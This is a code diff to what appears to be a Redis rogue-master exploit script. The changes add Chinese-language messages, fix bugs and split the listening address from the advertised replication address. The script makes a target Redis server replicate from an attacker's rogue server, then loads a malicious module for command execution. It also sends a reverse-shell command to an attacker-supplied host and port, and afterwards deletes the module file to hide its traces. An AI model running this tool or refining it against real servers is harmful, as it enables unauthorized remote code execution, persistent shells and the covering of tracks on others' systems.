@@ -7,7 +7,8 @@ from optparse import OptionParser
 CLRF = "\r\n"
 SERVER_EXP_MOD_FILE = "exp.so"
 
-BANNER = """______         _ _      ______                         _____                          
+# 修复转义警告：将原始字符串改为r前缀（避免反斜杠转义）
+BANNER = r"""______         _ _      ______                         _____                          
 | ___ \       | (_)     | ___ \                       /  ___|                         
 | |_/ /___  __| |_ ___  | |_/ /___   __ _ _   _  ___  \ `--.  ___ _ ____   _____ _ __ 
 |    // _ \/ _` | / __| |    // _ \ / _` | | | |/ _ \  `--. \/ _ \ '__\ \ / / _ \ '__|
@@ -44,6 +45,7 @@ def info(msg):
 def error(msg):
     print(f"\033[1;31;40m[err ]\033[0m {msg}")
 
+# 修复UnicodeDecodeError：兼容二进制/多编码数据
 def din(sock, cnt=4096):
     global verbose
     msg = sock.recv(cnt)
@@ -52,7 +54,11 @@ def din(sock, cnt=4096):
             print(f"\033[1;34;40m[->]\033[0m {msg}")
         else:
             print(f"\033[1;34;40m[->]\033[0m {msg[:80]}......{msg[-80:]}")
-    return msg.decode('gb18030')
+    # 优先UTF-8解码，失败则忽略错误（兼容二进制）
+    try:
+        return msg.decode('utf-8', errors='ignore')
+    except:
+        return msg.decode('gb18030', errors='ignore')
 
 def dout(sock, msg):
     global verbose
@@ -149,7 +155,7 @@ def reverse(remote):
     info("Open reverse shell...")
     addr = input("Reverse server address: ")
     port = input("Reverse server port: ")
-    dout(remote, encode_cmd(f"system.rev {addr} {port}"))
+    dout(remote._sock, encode_cmd(f"system.rev {addr} {port}"))  # 修复dout参数错误
     info("Reverse shell payload sent.")
     info(f"Check at {addr}:{port}")
 
@@ -157,24 +163,26 @@ def cleanup(remote):
     info("Unload module...")
     remote.do("MODULE UNLOAD system")
 
-def runserver(rhost, rport, lhost, lport, passwd):
-    # expolit
+def runserver(rhost, rport, slave_host, slave_port, bind_host, bind_port, passwd):
+    # exploit
     remote = Remote(rhost, rport)
-    info("Setting master...")
+    info("开始设置主从复制...")
     # auth 
     if passwd:
-    	info("Authenticating...")
-    	remote.do(f"AUTH {passwd}")
-    remote.do(f"SLAVEOF {lhost} {lport}")
-    info("Setting dbfilename...")
+        info("正在认证...")
+        remote.do(f"AUTH {passwd}")
+    remote.do(f"SLAVEOF {slave_host} {slave_port}")
+    info(f"SLAVEOF 目标地址: {slave_host}:{slave_port}")
+    info("正在设置 dbfilename...")
     remote.do(f"CONFIG SET dbfilename {SERVER_EXP_MOD_FILE}")
     sleep(2)
-    rogue = RogueServer(lhost, lport)
+    rogue = RogueServer(bind_host, bind_port)
+    info(f"本地监听地址: {bind_host}:{bind_port}")
     rogue.exp()
     sleep(2)
-    info("Loading module...")
+    info("正在加载模块...")
     remote.do(f"MODULE LOAD ./{SERVER_EXP_MOD_FILE}")
-    info("Temerory cleaning up...")
+    info("临时清理中...")
     remote.do("SLAVEOF NO ONE")
     remote.do("CONFIG SET dbfilename dump.rdb")
     remote.shell_cmd(f"rm ./{SERVER_EXP_MOD_FILE}")
@@ -193,22 +201,28 @@ if __name__ == '__main__':
     print(BANNER)
     parser = OptionParser()
     parser.add_option("--rhost", dest="rh", type="string",
-            help="target host", metavar="REMOTE_HOST")
+            help="目标 Redis 主机", metavar="REMOTE_HOST")
     parser.add_option("--rport", dest="rp", type="int",
-            help="target redis port, default 6379", default=6379,
+            help="目标 Redis 端口，默认 6379", default=6379,
             metavar="REMOTE_PORT")
     parser.add_option("--lhost", dest="lh", type="string",
-            help="rogue server ip", metavar="LOCAL_HOST")
+            help="SLAVEOF 使用的主机地址（可填写映射域名或公网地址）", metavar="SLAVE_HOST")
     parser.add_option("--lport", dest="lp", type="int",
-            help="rogue server listen port, default 21000", default=21000,
-            metavar="LOCAL_PORT")
+            help="SLAVEOF 使用的端口，默认 21000", default=21000,
+            metavar="SLAVE_PORT")
+    parser.add_option("--bind-host", dest="bh", type="string",
+            help="本地监听地址，默认 0.0.0.0", default="0.0.0.0",
+            metavar="BIND_HOST")
+    parser.add_option("--bind-port", dest="bp", type="int",
+            help="本地监听端口，默认 21000", default=21000,
+            metavar="BIND_PORT")
     parser.add_option("--exp", dest="exp", type="string",
-            help="Redis Module to load, default exp.so", default="exp.so",
+            help="要加载的 Redis 模块文件，默认 exp.so", default="exp.so",
             metavar="EXP_FILE")
     parser.add_option("-v", "--verbose", action="store_true", default=False,
-            help="Show full data stream")
+            help="显示完整的数据流")
     parser.add_option("--passwd", dest="rpasswd", type="string",
-            help="target redis password")
+            help="目标 Redis 密码")
 
     (options, args) = parser.parse_args()
     global verbose, payload, exp_mod
@@ -219,9 +233,10 @@ if __name__ == '__main__':
     if not options.rh or not options.lh:
         parser.error("Invalid arguments")
 
-    info(f"TARGET {options.rh}:{options.rp}")
-    info(f"SERVER {options.lh}:{options.lp}")
+    info(f"目标 Redis: {options.rh}:{options.rp}")
+    info(f"SLAVEOF 地址: {options.lh}:{options.lp}")
+    info(f"本地监听: {options.bh}:{options.bp}")
     try:
-        runserver(options.rh, options.rp, options.lh, options.lp, options.rpasswd)
+        runserver(options.rh, options.rp, options.lh, options.lp, options.bh, options.bp, options.rpasswd)
     except Exception as e:
         error(repr(e))
